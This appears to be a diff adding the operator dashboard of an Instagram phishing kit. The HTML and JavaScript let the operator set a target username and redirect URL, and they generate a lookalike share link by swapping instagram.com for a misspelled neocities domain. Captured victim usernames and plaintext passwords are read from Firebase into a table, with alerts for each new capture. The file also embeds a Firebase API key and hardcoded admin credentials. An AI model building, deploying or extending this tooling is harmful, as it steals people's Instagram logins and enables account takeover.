@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Clone Admin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #8ab4f8;
+            --primary-dark: #5390e5;
+            --secondary: #2374ab;
+            --secondary-dark: #1a5c8a;
+            --danger: #ff4d6d;
+            --success: #72e088;
+            --dark-bg: #18191a;
+            --panel-bg: #23272f;
+            --panel-darker: #202124;
+            --text-light: #e4e6eb;
+            --text-muted: #9ea3af;
+            --border-color: #3a3b3c;
+        }
+        
+        * {
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+        }
+        
+        body {
+            background: var(--dark-bg);
+            color: var(--text-light);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(90, 92, 106, 0.05) 0%, transparent 15%),
+                radial-gradient(circle at 80% 40%, rgba(90, 92, 106, 0.07) 0%, transparent 15%),
+                radial-gradient(circle at 40% 80%, rgba(90, 92, 106, 0.05) 0%, transparent 15%);
+        }
+        
+        .page-container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: var(--panel-bg);
+            padding: 1rem 2rem;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            color: var(--primary);
+        }
+        
+        .header h1 i {
+            margin-right: 0.75rem;
+            font-size: 1.75rem;
+        }
+        
+        .header .user-info {
+            display: flex;
+            align-items: center;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        
+        .header .user-info i {
+            margin-right: 0.5rem;
+            color: var(--primary);
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            flex: 1;
+        }
+        
+        .panel {
+            background: var(--panel-bg);
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            margin-bottom: 2rem;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .panel-header {
+            padding: 1.25rem 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .panel-header h2 {
+            margin: 0;
+            color: var(--primary);
+            font-size: 1.25rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .panel-header h2 i {
+            margin-right: 0.75rem;
+        }
+        
+        .panel-body {
+            padding: 1.5rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: var(--primary);
+        }
+        
+        input[type="text"], input[type="url"] {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            background: var(--dark-bg);
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+        
+        input[type="text"]:focus, input[type="url"]:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.25);
+            outline: none;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 0.75rem;
+            margin-top: 1rem;
+        }
+        
+        button {
+            background: var(--secondary);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+        
+        button i {
+            margin-right: 0.5rem;
+        }
+        
+        button:hover {
+            background: var(--secondary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button.primary {
+            background: var(--primary);
+            color: var(--dark-bg);
+        }
+        
+        button.primary:hover {
+            background: var(--primary-dark);
+        }
+        
+        .status {
+            margin-top: 1rem;
+            padding: 0.75rem;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            opacity: 0;
+            height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .status.show {
+            opacity: 1;
+            height: auto;
+            margin-bottom: 0.5rem;
+        }
+        
+        .status.success {
+            background: rgba(114, 224, 136, 0.1);
+            color: var(--success);
+            border-left: 4px solid var(--success);
+        }
+        
+        .status i {
+            margin-right: 0.5rem;
+            font-size: 1.1rem;
+        }
+        
+        .share-box {
+            background: rgba(138, 180, 248, 0.1);
+            border-radius: 8px;
+            padding: 1.25rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(138, 180, 248, 0.2);
+            display: none;
+            animation: slideDown 0.4s ease;
+        }
+        
+        .share-box.show {
+            display: block;
+        }
+        
+        .share-box-header {
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        .share-box-header i {
+            margin-right: 0.5rem;
+        }
+        
+        .share-controls {
+            display: flex;
+            gap: 0.5rem;
+        }
+        
+        .share-controls input {
+            flex: 1;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logins-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.95rem;
+        }
+        
+        .logins-table th, .logins-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .logins-table th {
+            background: var(--panel-darker);
+            color: var(--primary);
+            font-weight: 500;
+            position: sticky;
+            top: 0;
+        }
+        
+        .logins-table tr:nth-child(even) {
+            background: rgba(0, 0, 0, 0.1);
+        }
+        
+        .logins-table tr:hover {
+            background: rgba(138, 180, 248, 0.05);
+        }
+        
+        .logins-table td.time {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        
+        .logins-table td.username {
+            font-weight: 500;
+        }
+        
+        .empty-state {
+            padding: 2rem;
+            text-align: center;
+            color: var(--text-muted);
+        }
+        
+        .empty-state i {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            opacity: 0.7;
+        }
+        
+        .footer {
+            background: var(--panel-bg);
+            padding: 1rem 2rem;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .loader {
+            border: 3px solid rgba(138, 180, 248, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid var(--primary);
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 0.5rem;
+            vertical-align: middle;
+        }
+        
+        /* Badge for login count */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--primary);
+            color: var(--dark-bg);
+            border-radius: 12px;
+            padding: 0.25rem 0.75rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-left: 1rem;
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(138, 180, 248, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(138, 180, 248, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(138, 180, 248, 0); }
+        }
+        
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            right: 20px;
+            bottom: 20px;
+            background: var(--panel-darker);
+            color: var(--text-light);
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            display: flex;
+            align-items: center;
+            z-index: 1000;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        .toast i {
+            margin-right: 0.75rem;
+            color: var(--primary);
+            font-size: 1.25rem;
+        }
+        
+        /* Media queries */
+        @media (max-width: 768px) {
+            .header {
+                padding: 1rem;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .header .user-info {
+                margin-top: 0.5rem;
+            }
+            
+            .container {
+                padding: 0 1rem;
+                margin: 1rem auto;
+            }
+            
+            .panel-header, .panel-body {
+                padding: 1rem;
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            button {
+                width: 100%;
+            }
+            
+            .share-controls {
+                flex-direction: column;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logins-table, .logins-table thead, .logins-table tbody, .logins-table th, 
+            .logins-table td, .logins-table tr {
+                display: block;
+                width: 100%;
+            }
+            
+            .logins-table thead {
+                display: none;
+            }
+            
+            .logins-table tr {
+                margin-bottom: 1rem;
+                background: var(--panel-bg) !important;
+                border-radius: 8px;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+                border: 1px solid var(--border-color);
+                padding: 0.5rem;
+                animation: fadeIn 0.3s ease forwards;
+            }
+            
+            .logins-table td {
+                border: none;
+                position: relative;
+                padding: 0.5rem 0.75rem;
+            }
+            
+            .logins-table td:before {
+                content: attr(data-label);
+                font-weight: 600;
+                color: var(--primary);
+                display: block;
+                margin-bottom: 0.25rem;
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="adminLogin" style="display:none;min-height:100vh;align-items:center;justify-content:center;flex-direction:column;background:var(--dark-bg);">
+        <form id="adminLoginForm" style="max-width:340px;width:100%;margin:80px auto 0 auto;padding:32px 24px;background:var(--panel-bg);border-radius:12px;box-shadow:0 4px 24px 0 rgba(0,0,0,0.25);display:flex;flex-direction:column;gap:18px;">
+            <h2 style="color:var(--primary);text-align:center;margin-bottom:10px;"><i class="fas fa-user-shield"></i> Admin Login</h2>
+            <div>
+                <label for="adminUsername" style="color:var(--primary);font-weight:500;">Username</label>
+                <input type="text" id="adminUsername" required autocomplete="username" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid #555;background:#18191a;color:#e4e6eb;font-size:1rem;">
+            </div>
+            <div>
+                <label for="adminPassword" style="color:var(--primary);font-weight:500;">Password</label>
+                <input type="password" id="adminPassword" required autocomplete="current-password" style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid #555;background:#18191a;color:#e4e6eb;font-size:1rem;">
+            </div>
+            <button type="submit" style="background:var(--secondary);color:#fff;border:none;border-radius:8px;padding:12px 0;font-size:1rem;font-weight:bold;cursor:pointer;">Login</button>
+            <div id="adminLoginError" style="color:var(--danger);min-height:18px;text-align:center;"></div>
+        </form>
+    </div>
+    <div class="page-container" id="adminPanel" style="display:none;">
+        <header class="header">
+            <h1><i class="fas fa-lock"></i> Instagram Clone Admin</h1>
+            <div class="user-info">
+                <i class="fas fa-user-shield"></i>
+                <span>Administrator</span>
+                <button id="logoutBtn" style="margin-left:1.5rem;background:var(--danger);color:#fff;border:none;border-radius:6px;padding:6px 16px;cursor:pointer;font-size:1rem;display:flex;align-items:center;gap:8px;">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+            </div>
+        </header>
+        
+        <div class="container">
+            <div class="panel">
+                <div class="panel-header">
+                    <h2><i class="fas fa-cog"></i> Configuration</h2>
+                    <span id="lastUpdated" class="text-muted" style="font-size: 0.85rem; color: var(--text-muted);"></span>
+                </div>
+                <div class="panel-body">
+                    <div id="shareBox" class="share-box">
+                        <div class="share-box-header">
+                            <i class="fas fa-share-alt"></i> Share Link
+                        </div>
+                        <div class="share-controls">
+                            <input id="shareLink" type="text" readonly>
+                            <button id="copyBtn" class="primary">
+                                <i class="fas fa-copy"></i> Copy
+                            </button>
+                            <button id="openBtn">
+                                <i class="fas fa-external-link-alt"></i> Open
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <form id="updateForm">
+                        <div class="form-group">
+                            <label for="username"><i class="fas fa-user"></i> Username</label>
+                            <input type="text" id="username" required placeholder="Target Instagram username">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="url"><i class="fas fa-link"></i> Redirect URL</label>
+                            <input type="url" id="url" required placeholder="https://example.com/your-redirect">
+                        </div>
+                        
+                        <div class="button-group">
+                            <button type="submit">
+                                <i class="fas fa-save"></i> Update Configuration
+                            </button>
+                            <button type="button" id="clearLogins" style="background: var(--danger);">
+                                <i class="fas fa-trash-alt"></i> Clear Login Data
+                            </button>
+                        </div>
+                        
+                        <div id="statusMsg" class="status success">
+                            <i class="fas fa-check-circle"></i>
+                            <span></span>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            
+            <div class="panel">
+                <div class="panel-header">
+                    <h2>
+                        <i class="fas fa-clipboard-list"></i> Login Attempts
+                        <span id="loginCount" class="badge">0</span>
+                    </h2>
+                    <div>
+                        <button id="refreshBtn" style="padding: 0.5rem; background: transparent; color: var(--primary);">
+                            <i class="fas fa-sync-alt"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="panel-body">
+                    <div class="table-container">
+                        <table class="logins-table" id="loginsTable">
+                            <thead>
+                                <tr>
+                                    <th width="25%"><i class="far fa-clock"></i> Time</th>
+                                    <th width="35%"><i class="far fa-user"></i> Username</th>
+                                    <th width="40%"><i class="fas fa-key"></i> Password</th>
+                                </tr>
+                            </thead>
+                            <tbody id="loginsBody">
+                                <!-- login rows here -->
+                            </tbody>
+                        </table>
+                        <div id="emptyState" class="empty-state">
+                            <i class="far fa-folder-open"></i>
+                            <p>No login attempts recorded yet</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <footer class="footer">
+            <p>&copy; 2025 Instagram Clone Admin Panel | Secure Dashboard</p>
+        </footer>
+    </div>
+    
+    <div id="toast" class="toast">
+        <i class="fas fa-info-circle"></i>
+        <span id="toastText"></span>
+    </div>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <script>
+        // Firebase config
+        const firebaseConfig = {
+          apiKey: "AIzaSyAuab6m75ikOrW6Tc8Tf6ydwULBG6Y4dBk",
+          authDomain: "instagram-db13d.firebaseapp.com",
+          projectId: "instagram-db13d",
+          storageBucket: "instagram-db13d.firebasestorage.app",
+          messagingSenderId: "367666128774",
+          appId: "1:367666128774:web:3d445ce0cd38ab7ac52e07",
+          measurementId: "G-NPSG0D0KBK"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        // Toast notification function
+        function showToast(message, type = 'info') {
+            const toast = document.getElementById('toast');
+            const toastText = document.getElementById('toastText');
+            const icon = toast.querySelector('i');
+            
+            toastText.textContent = message;
+            
+            // Set icon based on type
+            if (type === 'success') {
+                icon.className = 'fas fa-check-circle';
+                toast.style.borderLeftColor = 'var(--success)';
+                icon.style.color = 'var(--success)';
+            } else if (type === 'error') {
+                icon.className = 'fas fa-exclamation-circle';
+                toast.style.borderLeftColor = 'var(--danger)';
+                icon.style.color = 'var(--danger)';
+            } else {
+                icon.className = 'fas fa-info-circle';
+                toast.style.borderLeftColor = 'var(--primary)';
+                icon.style.color = 'var(--primary)';
+            }
+            
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Helper to create shareable link
+        function getShareableUrl(instaUrl) {
+            if (!instaUrl) return '';
+            try {
+                const url = new URL(instaUrl);
+                if (url.hostname === "www.instagram.com") {
+                    return instaUrl.replace("https://www.instagram.com", "https://www.instagarame.neocities.org");
+                }
+                return instaUrl;
+            } catch {
+                return instaUrl;
+            }
+        }
+
+        function showShareBox(url) {
+            const shareBox = document.getElementById('shareBox');
+            const shareLink = document.getElementById('shareLink');
+            if (url) {
+                shareLink.value = getShareableUrl(url);
+                shareBox.classList.add('show');
+            } else {
+                shareBox.classList.remove('show');
+            }
+        }
+
+        // Format date and time
+        function formatDateTime(timestamp) {
+            const date = new Date(timestamp);
+            return date.toLocaleString('en-US', { 
+                year: 'numeric', 
+                month: 'short', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+
+        // On load, show share link if url exists
+        async function loadSettings() {
+            try {
+                const snap = await db.ref('/').once('value');
+                const data = snap.val() || {};
+                document.getElementById('username').value = data.username || '';
+                document.getElementById('url').value = data.url || '';
+                showShareBox(data.url || '');
+                
+                // Show last updated time if available
+                if (data.lastUpdated) {
+                    document.getElementById('lastUpdated').textContent = 
+                        'Last updated: ' + formatDateTime(data.lastUpdated);
+                }
+                
+                // Add animation to input fields
+                document.querySelectorAll('input').forEach(input => {
+                    if (input.value) {
+                        input.style.borderColor = 'var(--primary)';
+                        setTimeout(() => {
+                            input.style.borderColor = 'var(--border-color)';
+                        }, 1000);
+                    }
+                });
+            } catch (error) {
+                console.error("Error loading settings:", error);
+                showToast("Failed to load settings", "error");
+            }
+        }
+
+        // Update username and url
+        document.getElementById('updateForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<span class="loader"></span> Updating...';
+            submitBtn.disabled = true;
+            
+            try {
+                const username = document.getElementById('username').value.trim();
+                const url = document.getElementById('url').value.trim();
+                
+                await db.ref('/').update({ 
+                    username, 
+                    url,
+                    lastUpdated: firebase.database.ServerValue.TIMESTAMP
+                });
+                
+                // Show status message with animation
+                const statusMsg = document.getElementById('statusMsg');
+                statusMsg.querySelector('span').textContent = "Configuration updated successfully!";
+                statusMsg.classList.add('show');
+                
+                showShareBox(url);
+                showToast("Configuration updated successfully!", "success");
+                
+                setTimeout(() => {
+                    statusMsg.classList.remove('show');
+                }, 3000);
+                
+                // Update last updated time
+                const snap = await db.ref('/').once('value');
+                const data = snap.val() || {};
+                if (data.lastUpdated) {
+                    document.getElementById('lastUpdated').textContent = 
+                        'Last updated: ' + formatDateTime(data.lastUpdated);
+                }
+            } catch (error) {
+                console.error("Error updating configuration:", error);
+                showToast("Failed to update configuration", "error");
+            } finally {
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            }
+        });
+
+        // Copy and open button handlers
+        document.getElementById('copyBtn').onclick = function() {
+            const shareLink = document.getElementById('shareLink');
+            shareLink.select();
+            shareLink.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            
+            this.innerHTML = '<i class="fas fa-check"></i> Copied!';
+            setTimeout(() => {
+                this.innerHTML = '<i class="fas fa-copy"></i> Copy';
+            }, 2000);
+            
+            showToast("Link copied to clipboard!", "success");
+        };
+        
+        document.getElementById('openBtn').onclick = function() {
+            const shareLink = document.getElementById('shareLink').value;
+            if (shareLink) window.open(shareLink, '_blank');
+        };
+        
+        // Clear logins button
+        document.getElementById('clearLogins').addEventListener('click', async function() {
+            if (confirm("Are you sure you want to clear all login data? This action cannot be undone.")) {
+                try {
+                    await db.ref('logins').remove();
+                    showToast("All login data has been cleared", "success");
+                } catch (error) {
+                    console.error("Error clearing logins:", error);
+                    showToast("Failed to clear login data", "error");
+                }
+            }
+        });
+        
+        // Refresh button
+        document.getElementById('refreshBtn').addEventListener('click', function() {
+            this.classList.add('fa-spin');
+            setTimeout(() => {
+                this.classList.remove('fa-spin');
+            }, 1000);
+            loadLogins();
+        });
+
+        // Load login attempts
+        function loadLogins() {
+            db.ref('logins').on('value', snap => {
+                const body = document.getElementById('loginsBody');
+                const emptyState = document.getElementById('emptyState');
+                body.innerHTML = '';
+                
+                const logins = snap.val() || {};
+                const rows = Object.values(logins).reverse();
+                
+                // Update login count badge
+                document.getElementById('loginCount').textContent = rows.length;
+                
+                if (rows.length === 0) {
+                    emptyState.style.display = 'block';
+                } else {
+                    emptyState.style.display = 'none';
+                    
+                    rows.forEach((login, index) => {
+                        const tr = document.createElement('tr');
+                        tr.style.animationDelay = `${index * 0.05}s`;
+                        
+                        tr.innerHTML = `
+                            <td class="time" data-label="Time">
+                                <i class="far fa-clock" style="margin-right: 5px; opacity: 0.7;"></i>
+                                ${login.time || ''}
+                            </td>
+                            <td class="username" data-label="Username">
+                                <i class="far fa-user" style="margin-right: 5px; opacity: 0.7;"></i>
+                                ${login.username || ''}
+                            </td>
+                            <td data-label="Password">
+                                <i class="fas fa-key" style="margin-right: 5px; opacity: 0.7;"></i>
+                                ${login.password || ''}
+                            </td>
+                        `;
+                        body.appendChild(tr);
+                    });
+                    
+                    // Notify if there are new logins
+                    if (rows.length > 0 && window.previousLoginCount !== undefined && rows.length > window.previousLoginCount) {
+                        const newCount = rows.length - window.previousLoginCount;
+                        showToast(`${newCount} new login attempt${newCount > 1 ? 's' : ''} received!`, "info");
+                    }
+                    
+                    window.previousLoginCount = rows.length;
+                }
+            });
+        }
+        
+        // Admin login logic
+        function showAdminPanel() {
+            document.getElementById('adminLogin').style.display = 'none';
+            document.getElementById('adminPanel').style.display = '';
+        }
+        function showLoginScreen() {
+            document.getElementById('adminLogin').style.display = 'flex';
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+        function isAdminLoggedIn() {
+            return localStorage.getItem('admin_logged_in') === 'true';
+        }
+        function setAdminLoggedIn(val) {
+            localStorage.setItem('admin_logged_in', val ? 'true' : 'false');
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add loading animation
+            document.body.style.opacity = '0';
+            setTimeout(() => {
+                document.body.style.opacity = '1';
+                document.body.style.transition = 'opacity 0.5s ease';
+            }, 100);
+            
+            if (isAdminLoggedIn()) {
+                showAdminPanel();
+                loadSettings();
+                loadLogins();
+                setTimeout(() => {
+                    showToast("Welcome to Admin Dashboard", "info");
+                }, 1000);
+            } else {
+                showLoginScreen();
+            }
+        });
+
+        document.getElementById('adminLoginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('adminUsername').value.trim();
+            const pass = document.getElementById('adminPassword').value.trim();
+            const errorDiv = document.getElementById('adminLoginError');
+            if (user === 'admin' && pass === 'adminuser') {
+                setAdminLoggedIn(true);
+                showAdminPanel();
+                loadSettings();
+                loadLogins();
+                showToast("Admin login successful!", "success");
+            } else {
+                errorDiv.textContent = "Invalid username or password";
+            }
+        });
+
+        document.getElementById('logoutBtn').onclick = function() {
+            setAdminLoggedIn(false);
+            showLoginScreen();
+        };
+    </script>
+</body>
+</html>
